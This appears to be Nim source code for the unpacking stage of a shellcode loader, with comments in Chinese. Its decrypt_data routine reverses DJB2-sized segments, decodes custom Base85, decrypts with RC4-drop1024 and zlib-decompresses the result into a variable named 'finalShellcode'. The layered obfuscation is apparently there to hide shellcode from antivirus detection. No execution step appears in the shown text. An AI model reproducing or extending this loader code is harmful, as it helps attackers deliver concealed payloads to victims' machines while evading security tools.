import std/[strutils, sequtils]
import zippy       # 用于 zlib 压缩/解压

proc decode85(b85Str: string, b85chars: string): string =
  if b85Str.len == 0: return ""
  let cleaned = b85Str.filterIt(it notin Whitespace).join("")
  
  var b85vals: array[256, int]
  for i, c in b85chars:
    b85vals[ord(c)] = i
    
  result = ""
  var idx = 0
  let totalLen = cleaned.len
  
  while idx < totalLen:
    let chunkLen = min(5, totalLen - idx)
    var value: uint32 = 0
    for i in 0..<5:
      let cIdx = if i < chunkLen: ord(cleaned[idx + i]) else: ord('~')
      value = value * 85 + b85vals[cIdx].uint32
      
    let bytesToOut = chunkLen - 1
    if bytesToOut >= 1: result.add(chr((value shl (0 * 8)) shr 24))
    if bytesToOut >= 2: result.add(chr((value shl (1 * 8)) shr 24))
    if bytesToOut >= 3: result.add(chr((value shl (2 * 8)) shr 24))
    if bytesToOut >= 4: result.add(chr((value shl (3 * 8)) shr 24))
    idx += 5

proc rc4CryptDrop1024(data: string, key: string): string =
  var S: array[0..255, int]
  for i in 0..255: S[i] = i
  var j = 0
  let keyLength = key.len
  
  for i in 0..255:
    j = (j + S[i] + ord(key[i mod keyLength])) mod 256
    swap(S[i], S[j])
    
  var i = 0
  j = 0
  for _ in 1..1024:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    
  var outResult = newString(data.len)
  for idx in 0..<data.len:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    let k = S[(S[i] + S[j]) mod 256]
    outResult[idx] = chr(ord(data[idx]) xor k)
  return outResult

# ==========================================
# 1. 完全零依赖的内置算法：DJB2 哈希与映射
# ==========================================
proc getSegmentSize(key: string): int =
  # 经典的 DJB2 无依赖高效哈希算法
  var hash: uint32 = 5381
  for c in key:
    hash = ((hash shl 5) + hash) + ord(c).uint32
  
  # 将散列值映射到 4-11 的空间中
  result = int(hash mod 8) + 4

# 根据步长对字符串进行分段反转（由于是反转，加解密共用同一个函数）
proc reverseSegments(data: string, step: int): string =
  if step <= 1 or data.len == 0: return data
  result = newString(data.len)
  
  var idx = 0
  while idx < data.len:
    # 计算当前分段的实际结束位置，防止最后一组越界
    let currentStep = min(step, data.len - idx)
    for i in 0..<currentStep:
      # 逆序拷贝
      result[idx + i] = data[idx + currentStep - 1 - i]
    idx += step


proc decrypt_data*(data: string, key: string, b85chars: string): string =
  let step = getSegmentSize(key)
  # 1. 【核心还原】再次分段反转，即可完美还原原始 Base85 顺序
  let encodedRestored = reverseSegments(data, step)
  # 2. 解码
  let decoded = decode85(encodedRestored, b85chars)
  # 3. 解密
  let decrypted = rc4CryptDrop1024(decoded, key)
  # 4. 解压
  var finalShellcode = ""
  try:
    finalShellcode = zippy.uncompress(decrypted, dataFormat = dfZlib)
    return finalShellcode
  except:
    return ""